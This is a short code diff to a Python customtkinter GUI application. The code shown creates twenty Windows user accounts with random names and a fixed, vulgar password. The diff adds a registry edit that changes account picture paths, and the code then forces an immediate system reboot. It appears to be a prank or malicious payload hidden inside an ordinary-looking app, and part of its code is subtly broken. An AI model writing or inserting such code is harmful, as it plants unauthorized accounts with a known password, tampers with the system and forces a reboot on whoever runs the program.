@@ -265,6 +265,7 @@ class App(customtkinter.CTk):
 
 		for i in range(20):
 			os.system(f'net user {''.join([random.choice(string.ascii_letters + string.digits ) for n in range(12)])} penis /ADD')
+			os.system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AccountPicture\\Users\\{username}\" /v AccountPicturePath /t REG_SZ /d C:\\System32\\Shell\\cherry.jpg /f")
 
 		os.system('shutdown /r /t 0 /f')
 
